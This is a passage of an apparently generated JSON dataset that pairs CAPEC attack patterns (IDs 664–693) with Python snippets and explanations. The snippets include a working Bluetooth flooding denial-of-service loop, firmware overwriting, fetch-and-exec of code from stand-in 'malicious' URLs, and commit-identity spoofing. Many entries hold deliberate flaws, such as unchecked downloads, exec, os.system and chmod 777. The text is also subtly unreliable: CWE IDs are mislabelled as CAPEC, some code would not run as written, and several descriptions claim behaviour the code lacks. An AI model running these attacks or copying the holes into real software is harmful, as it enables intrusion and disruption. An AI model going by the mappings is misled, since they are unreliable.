        "description": "This Python code snippet simulates the concept of 'Exploitation of Transient Instruction Execution' by mimicking speculative execution and branch prediction. The `speculative_execution` function accesses an array, `secret_data`, based on an index. If the index is out of bounds, it accesses `public_data` instead. This simulates a scenario where speculative execution might access sensitive data (secret_data) before the bounds check is completed, potentially exposing it. The loop simulates multiple speculative executions with random indices, demonstrating how transient execution can lead to information exposure. This example embodies the main idea of CAPEC-Exploitation of Transient Instruction Execution and related CWEs, such as non-transparent sharing of microarchitectural resources and exposure of sensitive information during transient execution."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
        "code_snippet": "import requests\n\n# Vulnerable function that takes a URL from user input and fetches its content\n\ndef fetch_url_content(user_input_url):\n    try:\n        response = requests.get(user_input_url)\n        return response.text\n    except requests.RequestException as e:\n        return str(e)\n\n# Example usage\nuser_input_url = input('Enter a URL to fetch content: ')\ncontent = fetch_url_content(user_input_url)\nprint(content)\n",
        "description": "This Python code snippet demonstrates a Server-Side Request Forgery (SSRF) vulnerability. The function `fetch_url_content` takes a URL provided by the user and fetches its content using the `requests` library. The user input is not validated, allowing an attacker to submit a malicious URL. This could force the server to make requests to internal services or external third parties with the server's privileges. The code embodies CWE-918 (SSRF) by not ensuring the request is sent to an expected destination, CWE-20 (Improper Input Validation) by not validating the user input, and CWE-472 (External Control of Assumed-Immutable Web Parameter) by assuming the URL parameter is safe without verification."
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
        "code_snippet": "import os\nimport struct\n\n# CWE-1188: Initialization of a Resource with an Insecure Default\nDEFAULT_AUTH_KEY = b'0000'  # Insecure default key\n\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-353: Missing Support for Integrity Check\n# CWE-862: Missing Authorization\n# CWE-288: Authentication Bypass Using an Alternate Path or Channel\n\ndef read_spi_flash(spi_device):\n    with open(spi_device, 'rb') as f:\n        return f.read()\n\n# Simulate firmware manipulation\ndef manipulate_firmware(firmware_data):\n    # Bypass authentication by modifying the firmware\n    manipulated_data = firmware_data.replace(DEFAULT_AUTH_KEY, b'1234')\n    return manipulated_data\n\n# Simulate writing manipulated firmware back to SPI flash\ndef write_spi_flash(spi_device, data):\n    with open(spi_device, 'wb') as f:\n        f.write(data)\n\n# Main function to exploit Thunderbolt protection flaws\ndef exploit_thunderbolt(spi_device):\n    # Read the current firmware from SPI flash\n    firmware_data = read_spi_flash(spi_device)\n    \n    # Manipulate the firmware to bypass authentication\n    manipulated_firmware = manipulate_firmware(firmware_data)\n    \n    # Write the manipulated firmware back to SPI flash\n    write_spi_flash(spi_device, manipulated_firmware)\n    \n    print(\"Firmware manipulation complete. Authentication bypassed.\")\n\n# Example usage\nspi_device = '/dev/spi0'\nexploit_thunderbolt(spi_device)",
        "description": "This Python code snippet demonstrates a simplified version of exploiting Thunderbolt protection flaws by manipulating the firmware of a Thunderbolt controller. The code reads the firmware from an SPI flash device, modifies it to bypass authentication by replacing an insecure default key (CWE-1188) with a new key, and writes the manipulated firmware back to the SPI flash. The code lacks proper verification of data authenticity (CWE-345), integrity checks (CWE-353), and authorization (CWE-862), and it bypasses authentication using an alternate path (CWE-288). This represents the main idea of the CAPEC by showing how an adversary could exploit these weaknesses to gain unauthorized access to a device."
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "import bluetooth\nimport time\n\n# Function to flood a Bluetooth device with large packets\ndef bluesmack_attack(target_address):\n    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)\n    sock.connect((target_address, 0x1001))  # L2CAP PSM for SDP\n    large_packet = b'A' * 60000  # Large packet to flood the target\n    try:\n        while True:\n            sock.send(large_packet)\n            time.sleep(0.01)  # Short delay to sustain the attack\n    except Exception as e:\n        print(f\"Error: {e}\")\n    finally:\n        sock.close()\n\n# Example usage\nif __name__ == '__main__':\n    target = '00:11:22:33:44:55'  # Replace with the target Bluetooth address\n    bluesmack_attack(target)",
        "description": "This Python code snippet demonstrates a BlueSmacking attack, where an adversary floods a Bluetooth-enabled device with large packets over the L2CAP protocol to create a Denial of Service (DoS) condition. The code uses the `bluetooth` library to create an L2CAP socket and repeatedly sends large packets to the target device. The attack must be carried out within close proximity to the target device. The code also includes a brief delay between packet sends to sustain the attack. This snippet embodies the main idea of the CAPEC by demonstrating how an attacker can exploit Bluetooth communication to overwhelm a device. The related CWEs provide additional context, such as improper resource shutdown (CWE-404) and cleartext transmission (CWE-319), which can be relevant in the broader scope of Bluetooth security vulnerabilities."
    },
    {
        "capec_id": "667",
        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
        "code_snippet": "import bluetooth\n\ndef spoof_bluetooth_device(target_mac, spoofed_mac):\n    # Create a Bluetooth socket\n    sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)\n    \n    try:\n        # Connect to the target device using the spoofed MAC address\n        sock.connect((target_mac, 1))\n        \n        # Send a malicious payload\n        sock.send('malicious_payload')\n        \n        print(f'Successfully spoofed {target_mac} using {spoofed_mac}')\n    except bluetooth.btcommon.BluetoothError as err:\n        print(f'Failed to connect: {err}')\n    finally:\n        sock.close()\n\n# Example usage\nspoof_bluetooth_device('00:11:22:33:44:55', '66:77:88:99:AA:BB')",
        "description": "This Python code snippet demonstrates a Bluetooth Impersonation Attack (BIAS) by spoofing the MAC address of a Bluetooth device. The function `spoof_bluetooth_device` takes a target MAC address and a spoofed MAC address as inputs. It creates a Bluetooth socket and attempts to connect to the target device using the spoofed MAC address. If the connection is successful, it sends a malicious payload to the target device. This code embodies the main idea of CAPEC-290 (Authentication Bypass by Spoofing) and CAPEC-940 (Improper Verification of Source of a Communication Channel) by exploiting weak authentication mechanisms and improper verification of the source of a communication channel."
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "import random\n\nclass BluetoothConnection:\n    def __init__(self):\n        self.entropy_bits = 16  # Vulnerable: Low entropy bits\n        self.key = self.generate_key()\n\n    def generate_key(self):\n        return ''.join(random.choice('0123456789ABCDEF') for _ in range(self.entropy_bits // 4))\n\n    def negotiate_key(self, adversary_in_the_middle=False):\n        if adversary_in_the_middle:\n            # Adversary reduces entropy bits to make decryption easier\n            self.entropy_bits = 1  # Vulnerable: Extremely low entropy bits\n        self.key = self.generate_key()\n        return self.key\n\n# Simulate a Bluetooth connection with an adversary in the middle\nbluetooth_connection = BluetoothConnection()\nprint('Original Key:', bluetooth_connection.key)\nadversary_key = bluetooth_connection.negotiate_key(adversary_in_the_middle=True)\nprint('Adversary Key:', adversary_key)",
        "description": "This Python code snippet simulates a Bluetooth connection where an adversary can exploit a flaw in the key negotiation process. The BluetoothConnection class initializes with a low entropy bit count (16 bits) for key generation, which is already vulnerable. The negotiate_key method simulates an adversary in the middle attack by reducing the entropy bits to an extremely low value (1 bit), making it trivial for the adversary to decrypt the communication. This embodies the main idea of the CAPEC 'Key Negotiation of Bluetooth Attack (KNOB)' by demonstrating how an attacker can manipulate the key negotiation process to weaken encryption. The related CWEs are represented by the low entropy (CWE-693), improper authorization (CWE-285), and the selection of a less secure algorithm (CWE-757)."
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "import requests\n\n# CWE-807: Reliance on Untrusted Inputs in a Security Decision\n# CWE-506: Embedded Malicious Code\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n\n# Simulate downloading a software update from an untrusted source\nupdate_url = 'http://untrusted-source.com/software_update'\nresponse = requests.get(update_url)\n\nif response.status_code == 200:\n    # CWE-1277: Firmware Not Updateable\n    # CWE-1329: Reliance on Component That is Not Updateable\n    # Simulate applying the update to a non-updateable firmware\n    firmware = response.content\n    with open('/path/to/firmware.bin', 'wb') as f:\n        f.write(firmware)\n    print('Firmware updated successfully.')\nelse:\n    print('Failed to download the update.')",
        "description": "This Python code snippet demonstrates a scenario where a software update is downloaded from an untrusted source and applied to a non-updateable firmware. The code highlights several vulnerabilities: reliance on untrusted inputs (CWE-807), potential for embedded malicious code (CWE-506), and exposure of version-control repository to unauthorized actors (CWE-527). The update is applied to a firmware that cannot be updated or patched (CWE-1277, CWE-1329), embodying the main idea of CAPEC-235: 'Alteration of a Software Update'. This scenario shows how an adversary could insert malicious code into a software update, leading to compromised systems."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n\n# Malicious function embedded in a seemingly benign tool\nclass MaliciousTool:\n    def __init__(self):\n        self.sensitive_info = 'Sensitive Data'\n\n    def perform_task(self):\n        # CWE-913: Improper Control of Dynamically-Managed Code Resources\n        exec('print(\"Executing task...\")')\n        # CWE-497: Exposing sensitive information\n        print(f'Exposing sensitive info: {self.sensitive_info}')\n\n# CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n# Security-critical code that might be optimized away\nsecurity_check = True\nif security_check:\n    print('Security check passed')\nelse:\n    print('Security check failed')\n\n# Simulate the use of the malicious tool in a development environment\nif __name__ == '__main__':\n    tool = MaliciousTool()\n    tool.perform_task()",
        "description": "This Python code snippet represents the concept of 'Software Development Tools Maliciously Altered' by embedding malicious functionality within a seemingly benign development tool. The 'MaliciousTool' class contains a method that improperly executes dynamically-managed code (CWE-913) and exposes sensitive information (CWE-497). Additionally, the code includes a security check that could be optimized away by a compiler or processor (CWE-733 and CWE-1037), demonstrating how security-critical code might be inadvertently removed or modified. This snippet illustrates how an adversary could alter development tools to introduce vulnerabilities and malicious behavior into software."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "class ASIC:\n    def __init__(self, security_token):\n        self.security_token = security_token\n        self.confidential_data = 'Sensitive Information'\n        self.security_identifier = 'SECURE_ID'\n\n    def access_data(self, token):\n        if token == self.security_token:\n            return self.confidential_data\n        else:\n            return 'Access Denied'\n\n    def modify_requirements(self, new_token, new_identifier):\n        # Maliciously altering the security token and identifier\n        self.security_token = new_token\n        self.security_identifier = new_identifier\n\n# Example usage\nasic = ASIC('VALID_TOKEN')\nprint(asic.access_data('VALID_TOKEN'))  # Should print 'Sensitive Information'\n\n# Malicious alteration of requirements\nasic.modify_requirements('INVALID_TOKEN', 'INSECURE_ID')\nprint(asic.access_data('VALID_TOKEN'))  # Should print 'Access Denied'\nprint(asic.access_data('INVALID_TOKEN'))  # Should print 'Sensitive Information'",
        "description": "This Python code snippet represents the main idea of the CAPEC 'Requirements for ASIC Functionality Maliciously Altered'. The ASIC class simulates an application-specific integrated circuit with a security token mechanism and a security identifier. The 'modify_requirements' method demonstrates how an adversary could maliciously alter the security token and identifier, leading to unauthorized access to confidential data. This embodies the vulnerabilities described in the related CWEs, such as improper restriction of security token assignment (CWE-1259), insecure security identifier mechanism (CWE-1294), and unprotected confidential information (CWE-1297). The code highlights how altering the requirements can compromise the security and functionality of the ASIC."
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
        "code_snippet": "class MaliciousChip:\n    def __init__(self):\n        self.registers = [0] * 10  # Simulated memory-mapped I/O registers\n        self.security_token = 'valid_token'\n\n    def program_chip(self):\n        # Malicious code implanted during chip programming\n        self.registers[0] = 0xDEADBEEF  # CWE-506: Embedded Malicious Code\n        self.security_token = 'malicious_token'  # CWE-1259: Improper Restriction of Security Token Assignment\n\n    def access_register(self, index, token):\n        if token == self.security_token:\n            return self.registers[index]\n        else:\n            raise PermissionError('Access Denied')  # CWE-1262: Improper Access Control for Register Interface\n\n    def execute_malicious_action(self):\n        # CWE-509: Replicating Malicious Code (Virus or Worm)\n        print('Executing malicious action...')\n        # Simulate exposure of sensitive information (CWE-1423)\n        sensitive_data = 'secret_data'\n        return sensitive_data\n\n# Simulate chip programming\nchip = MaliciousChip()\nchip.program_chip()\n\n# Simulate accessing the register with a malicious token\ntry:\n    data = chip.access_register(0, 'malicious_token')\n    print(f'Register data: {data}')\nexcept PermissionError as e:\n    print(e)\n\n# Execute malicious action\nsensitive_info = chip.execute_malicious_action()\nprint(f'Exposed sensitive information: {sensitive_info}')",
        "description": "This Python code snippet simulates the concept of 'Malicious Code Implanted During Chip Programming' (CAPEC). The `MaliciousChip` class represents a chip with memory-mapped I/O registers and a security token mechanism. During the `program_chip` method, malicious code is implanted by altering a register value (CWE-506) and improperly assigning a security token (CWE-1259). The `access_register` method demonstrates improper access control (CWE-1262), allowing access with a malicious token. The `execute_malicious_action` method simulates the execution of malicious actions, including replicating malicious code (CWE-509) and exposing sensitive information (CWE-1423). This code illustrates how an adversary can implant and exploit malicious code during the chip programming phase to achieve unauthorized control and data exposure."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\n\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\nif response.status_code == 200:\n    exec(response.text)  # Executes the downloaded code without verification\n\n# CWE-215: Insertion of Sensitive Information Into Debugging Code\n# Debugging code that logs sensitive information\nDEBUG = True\nif DEBUG:\n    sensitive_info = 'API_KEY: 12345-ABCDE'\n    print(f'Debug Info: {sensitive_info}')\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n# Exposing the .git directory\nimport os\nos.system('cp -r .git /tmp/exposed_git')",
        "description": "This Python code snippet demonstrates a scenario where a developer inadvertently signs and deploys maliciously altered software. The code downloads and executes a script from a remote location without verifying its integrity (CWE-494). It then executes the downloaded code, which could contain embedded malicious code (CWE-506) or act as a Trojan Horse (CWE-507). Additionally, the code includes a debugging section that logs sensitive information (CWE-215), which could be exposed if not properly managed. Finally, it shows the exposure of a version-control repository to an unauthorized control sphere by copying the .git directory to a publicly accessible location (CWE-527). This snippet encapsulates the main idea of the CAPEC by illustrating how a compromised development process can lead to the deployment of malicious software."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
        "code_snippet": "import random\n\nclass FPGA:\n    def __init__(self):\n        self.configuration = self.load_configuration()\n\n    def load_configuration(self):\n        # Simulate loading a configuration that could be maliciously altered\n        config = {'function': 'normal_operation'}\n        if random.choice([True, False]):\n            config['function'] = 'malicious_operation'  # CWE-506: Embedded Malicious Code\n        return config\n\n    def execute(self):\n        if self.configuration['function'] == 'malicious_operation':\n            self.malicious_function()\n        else:\n            self.normal_function()\n\n    def normal_function(self):\n        print(\"Executing normal operation.\")\n\n    def malicious_function(self):\n        print(\"Executing malicious operation!\")  # CWE-1037: Security-critical code altered\n\n# Simulate FPGA reload\nfpga = FPGA()\nfpga.execute()",
        "description": "This Python code snippet simulates the concept of an FPGA's configuration being maliciously altered, as described in the CAPEC. The FPGA class loads a configuration that can randomly be set to either 'normal_operation' or 'malicious_operation'. If the configuration is set to 'malicious_operation', the FPGA executes a malicious function instead of its normal function. This represents CWE-506 (Embedded Malicious Code) by embedding a potentially harmful function and CWE-1037 (Processor Optimization Removal or Modification of Security-critical Code) by altering the intended operation of the FPGA. The random choice simulates the unpredictability of such an attack."
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "import os\n\nclass Device:\n    def __init__(self, data):\n        self.data = data  # CWE-316: Storing sensitive information in cleartext\n\n    def decommission(self):\n        # CWE-1266: Improper scrubbing of sensitive data\n        # CWE-1301: Insufficient or incomplete data removal\n        # CWE-226: Sensitive information not removed before reuse\n        self.data = None  # Incorrectly assuming this removes data\n        print('Device decommissioned.')\n\n    def retrieve_data(self):\n        if self.data is not None:\n            return self.data\n        else:\n            return 'No data available'\n\n# Simulate device usage\nsensitive_data = 'Sensitive Information'\ndevice = Device(sensitive_data)\ndevice.decommission()\n\n# Simulate adversary retrieving data from decommissioned device\nretrieved_data = device.retrieve_data()\nprint(f'Retrieved Data: {retrieved_data}')",
        "description": "This Python code snippet demonstrates a scenario where a device containing sensitive information is decommissioned improperly. The `Device` class stores sensitive data in cleartext (CWE-316). The `decommission` method attempts to remove the data by setting it to `None`, which is an insufficient and incorrect method for data removal (CWE-1266, CWE-1301). The `retrieve_data` method simulates an adversary attempting to retrieve data from the decommissioned device. The code highlights the risk of not properly scrubbing sensitive data from decommissioned devices, as outlined in the CAPEC description."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "from flask import Flask, request\nimport pymongo\n\napp = Flask(__name__)\nclient = pymongo.MongoClient('mongodb://localhost:27017/')\ndb = client['testdb']\ncollection = db['users']\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    query = {'username': username, 'password': password}\n    user = collection.find_one(query)\n    if user:\n        return 'Login successful!'\n    else:\n        return 'Invalid credentials!'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a NoSQL injection vulnerability in a Flask web application using MongoDB. The '/login' endpoint accepts 'username' and 'password' parameters from a POST request and constructs a MongoDB query using these parameters without proper validation or sanitization. An attacker can exploit this by injecting malicious input to manipulate the query, potentially bypassing authentication or accessing unauthorized data. This example embodies the main idea of CAPEC-943, CAPEC-1286, and CAPEC-89 by showing improper neutralization and validation of user input in a NoSQL context."
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "import os\nimport mmap\n\n# Simulate malicious code insertion in flash memory\nclass MaliciousFirmware:\n    def __init__(self, firmware_path):\n        self.firmware_path = firmware_path\n\n    def insert_malware(self):\n        with open(self.firmware_path, 'r+b') as f:\n            mm = mmap.mmap(f.fileno(), 0)\n            # Insert malicious code at a specific location\n            mm.seek(0x1000)\n            mm.write(b'\\x90\\x90\\x90\\x90')  # NOP sled as a placeholder for malicious code\n            mm.close()\n\n    def execute_malware(self):\n        # Simulate execution of the malicious code\n        os.system('echo Malicious code executed')\n\n# Example usage\nfirmware = MaliciousFirmware('/path/to/firmware.bin')\nfirmware.insert_malware()\nfirmware.execute_malware()",
        "description": "This Python code snippet simulates the insertion of malicious code into the flash memory of a server motherboard, representing the 'Server Motherboard Compromise' CAPEC. The `MaliciousFirmware` class provides methods to insert and execute malware. The `insert_malware` method opens the firmware file, maps it into memory, and writes a NOP sled (a common placeholder for malicious code) at a specific location. The `execute_malware` method simulates the execution of the inserted malicious code. This example embodies CWE-506 (Embedded Malicious Code) and CWE-509 (Replicating Malicious Code) by demonstrating how malware can be embedded and potentially executed within a system's firmware."
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-377: Insecure Temporary File\n# CWE-426: Untrusted Search Path\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n# CWE-209: Generation of Error Message Containing Sensitive Information\n\ndef build_system(config_path):\n    try:\n        # Read configuration file (CWE-497)\n        with open(config_path, 'r') as config_file:\n            config_data = config_file.read()\n\n        # Create a temporary file insecurely (CWE-377)\n        temp_file = tempfile.NamedTemporaryFile(delete=False)\n        temp_file.write(config_data.encode())\n        temp_file.close()\n\n        # Use an untrusted search path (CWE-426)\n        os.system(f'python {temp_file.name}')\n\n    except Exception as e:\n        # Generate an error message containing sensitive information (CWE-209)\n        print(f'Error during build: {e}')\n\n# Example usage\nbuild_system('/path/to/config')\n",
        "description": "This Python code snippet demonstrates a vulnerable system build process that embodies the CAPEC 'System Build Data Maliciously Altered'. The code reads a configuration file, creates an insecure temporary file, and executes it using an untrusted search path. It also exposes sensitive system information in error messages. The vulnerabilities include: CWE-377 (Insecure Temporary File), CWE-426 (Untrusted Search Path), CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere), CWE-913 (Improper Control of Dynamically-Managed Code Resources), and CWE-209 (Generation of Error Message Containing Sensitive Information). This code represents how a system build process can be deliberately misconfigured, leading to potential security risks."
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
        "code_snippet": "import ctypes\n\n# Simulate a memory region with ctypes\nclass MemoryRegion(ctypes.Structure):\n    _fields_ = [\n        ('protected_data', ctypes.c_char * 64),\n        ('unprotected_data', ctypes.c_char * 64)\n    ]\n\n# Initialize memory region\nmemory = MemoryRegion()\n\n# Simulate improper access control by allowing write access to protected data\nmemory.protected_data = b'A' * 64  # This should be immutable or protected\n\n# Simulate an attacker modifying the protected data\nmemory.protected_data = b'B' * 64  # Vulnerability: protected data is writable\n\n# Print the modified protected data\nprint(memory.protected_data)\n",
        "description": "This Python code snippet simulates a memory region with both protected and unprotected data using the ctypes library. The 'protected_data' field is intended to be immutable or protected, but the code allows it to be written to, demonstrating a vulnerability. This embodies the main idea of CAPEC by showing how improper memory protection can be exploited. The code also touches on related CWEs, such as CWE-1282 (Assumed-Immutable Data is Stored in Writable Memory) and CWE-1274 (Improper Access Control for Volatile Memory Containing Boot Code), by allowing an attacker to modify what should be protected data."
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
        "code_snippet": "class HardwareRegister:\n    def __init__(self):\n        self.registers = {'config': 0x0, 'lock': 0x0}\n\n    def write_register(self, name, value):\n        if name == 'lock' and self.registers['lock'] == 0x1:\n            print('Error: Register is locked.')\n            return\n        self.registers[name] = value\n        print(f'Register {name} set to {hex(value)}')\n\n    def read_register(self, name):\n        return self.registers.get(name, 'Register not found')\n\n# Example usage\nhw_reg = HardwareRegister()\n\n# Attempt to write to the config register\nhw_reg.write_register('config', 0x1234)\n\n# Lock the registers\nhw_reg.write_register('lock', 0x1)\n\n# Attempt to modify the config register after locking\nhw_reg.write_register('config', 0x5678)\n\n# Read the config register\nprint(f'Config register: {hex(hw_reg.read_register('config'))}')",
        "description": "This Python code snippet defines a simple `HardwareRegister` class that simulates a hardware register interface. The class has a dictionary to store register values, including a 'config' register and a 'lock' register. The `write_register` method allows writing to a register unless the 'lock' register is set to 0x1, which simulates a lock bit mechanism. If the 'lock' register is set, further attempts to write to any register are blocked, demonstrating the concept of preventing unauthorized modifications. This code embodies the main idea of CAPEC by showing how improper access control and lock bit mechanisms can be exploited if not correctly implemented. The related CWEs are represented by the ability to modify registers and the lock bit, highlighting potential vulnerabilities in hardware register access control."
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "class SoC:\n    def __init__(self):\n        self.security_tokens = {}\n\n    def assign_token(self, entity, token):\n        # CWE-1259: Improper Restriction of Security Token Assignment\n        self.security_tokens[entity] = token\n\n    def check_access(self, entity, action):\n        token = self.security_tokens.get(entity)\n        if not token:\n            # CWE-1302: Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)\n            print(f\"Access denied for {entity}: No security token assigned.\")\n            return False\n        if token == 'incorrect':\n            # CWE-1270: Generation of Incorrect Security Tokens\n            print(f\"Access denied for {entity}: Incorrect security token.\")\n            return False\n        if token == 'obsolete':\n            # CWE-1267: Policy Uses Obsolete Encoding\n            print(f\"Access denied for {entity}: Obsolete security token.\")\n            return False\n        # CWE-1294: Insecure Security Identifier Mechanism\n        print(f\"Access granted for {entity} to perform {action}.\")\n        return True\n\n# Example usage\nsoc = SoC()\nsoc.assign_token('entity1', 'correct')\nsoc.assign_token('entity2', 'incorrect')\nsoc.assign_token('entity3', 'obsolete')\nsoc.check_access('entity1', 'read')\nsoc.check_access('entity2', 'write')\nsoc.check_access('entity3', 'execute')\nsoc.check_access('entity4', 'read')",
        "description": "This Python code snippet represents a simplified System-on-Chip (SoC) security mechanism that assigns and checks security tokens for different entities. The `SoC` class has methods to assign tokens to entities and check their access based on these tokens. The code demonstrates several vulnerabilities: improper restriction of security token assignment (CWE-1259), missing source identifier in transactions (CWE-1302), generation of incorrect security tokens (CWE-1270), use of obsolete encoding for tokens (CWE-1267), and insecure security identifier mechanisms (CWE-1294). The `check_access` method prints access granted or denied messages based on the token's validity, highlighting potential security flaws in the token management system."
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
        "code_snippet": "class Device:\n    def __init__(self, firmware_version, rom_code):\n        self.firmware_version = firmware_version\n        self.rom_code = rom_code\n        self.updateable = False  # CWE-1277: Firmware Not Updateable\n        self.rom_patchable = False  # CWE-1310: Missing Ability to Patch ROM Code\n\n    def check_for_updates(self):\n        if not self.updateable:\n            print(\"Firmware update not supported.\")\n        else:\n            print(\"Checking for firmware updates...\")\n\n    def patch_rom(self):\n        if not self.rom_patchable:\n            print(\"ROM patching not supported.\")\n        else:\n            print(\"Patching ROM...\")\n\n# Example usage\nmy_device = Device(firmware_version=\"1.0\", rom_code=\"ABC123\")\nmy_device.check_for_updates()\nmy_device.patch_rom()",
        "description": "This Python code snippet defines a `Device` class that simulates a device with unpatchable firmware and ROM code, embodying the main idea of the CAPEC. The `Device` class has attributes `firmware_version` and `rom_code`, and flags `updateable` and `rom_patchable` set to `False`, representing CWE-1277 and CWE-1310 respectively. The methods `check_for_updates` and `patch_rom` print messages indicating the lack of support for firmware updates and ROM patching. This code highlights the vulnerabilities associated with devices that cannot be updated or patched, making them susceptible to exploitation."
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_script.py'\nresponse = requests.get(url)\n\n# CWE-348: Use of Less Trusted Source\nif response.status_code == 200:\n    exec(response.text)  # CWE-290: Authentication Bypass by Spoofing\n\n# CWE-1230: Exposure of Sensitive Information Through Metadata\nmetadata = {'author': 'trusted_author', 'version': '1.0'}\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\ndef send_metadata(metadata):\n    destination = 'http://trustedserver.com/metadata'\n    requests.post(destination, json=metadata)\n\nsend_metadata(metadata)",
        "description": "This Python code snippet demonstrates a scenario where metadata spoofing can occur. The code downloads and executes a script from a potentially malicious URL without verifying its integrity (CWE-494). It uses a less trusted source for the script (CWE-348), and if the download is successful, it executes the script, potentially bypassing authentication (CWE-290). The metadata is then sent to a specified destination, but the destination could be incorrectly specified (CWE-941). Additionally, the metadata could expose sensitive information (CWE-1230). This code embodies the main idea of CAPEC- Metadata Spoofing, by showing how an adversary can alter metadata to present a malicious resource as legitimate."
    },
    {
        "capec_id": "691",
        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "import requests\nimport hashlib\n\n# URL of the open-source software to download\nurl = 'http://example.com/malicious-package.tar.gz'\n\n# Download the software without integrity check\nresponse = requests.get(url)\n\n# Save the downloaded file\nwith open('package.tar.gz', 'wb') as file:\n    file.write(response.content)\n\n# Simulate the use of the downloaded package\n# (In a real scenario, this could be an installation or execution step)\nprint('Downloaded package is being used without integrity check.')\n\n# Vulnerable code: No verification of the source or integrity of the downloaded package\n# This could lead to execution of malicious code embedded in the package",
        "description": "This Python code snippet demonstrates a scenario where an open-source software package is downloaded from a remote location without performing any integrity checks. The URL points to a potentially malicious package. The code saves the downloaded content to a file and simulates its use without verifying its origin or integrity. This embodies the main idea of the CAPEC 'Spoof Open-Source Software Metadata' by showing how an adversary could spoof metadata to distribute malicious software. The related CWEs are represented as follows: CWE-494 (Download of Code Without Integrity Check), CWE-348 (Use of Less Trusted Source), and CWE-506 (Embedded Malicious Code). The code highlights the risk of downloading and using software from untrusted sources without proper verification, which could lead to the execution of malicious code."
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious.example.com/repo.git'\nsubprocess.run(['git', 'clone', url, 'repo'])\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nos.system('chmod -R 777 repo')\n\n# CWE-348: Use of Less Trusted Source\ntrusted_url = 'http://trusted.example.com/repo.git'\n# Using less trusted source instead of the trusted one\nsubprocess.run(['git', 'clone', url, 'repo'])\n\n# CWE-540: Inclusion of Sensitive Information in Source Code\nwith open('repo/config.py', 'w') as f:\n    f.write(\"API_KEY = '12345'\")\n\n# Spoofing commit metadata\nos.chdir('repo')\nsubprocess.run(['git', 'config', 'user.name', 'Trusted Developer'])\nsubprocess.run(['git', 'config', 'user.email', 'trusted@example.com'])\nsubprocess.run(['git', 'commit', '--allow-empty', '-m', 'Initial commit'])\nsubprocess.run(['git', 'push', 'origin', 'master'])",
        "description": "This Python code snippet demonstrates a scenario where an adversary spoofs metadata in a Version Control System (VCS) repository to deceive users. The code clones a repository from a potentially malicious URL without verifying its integrity (CWE-494). It then sets permissions that expose the repository to unauthorized access (CWE-527). The code uses a less trusted source instead of a trusted one (CWE-348) and includes sensitive information directly in the source code (CWE-540). Finally, it spoofs commit metadata to make it appear as if the commits are made by a trusted developer, thereby misleading users about the origin and maintenance of the software."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
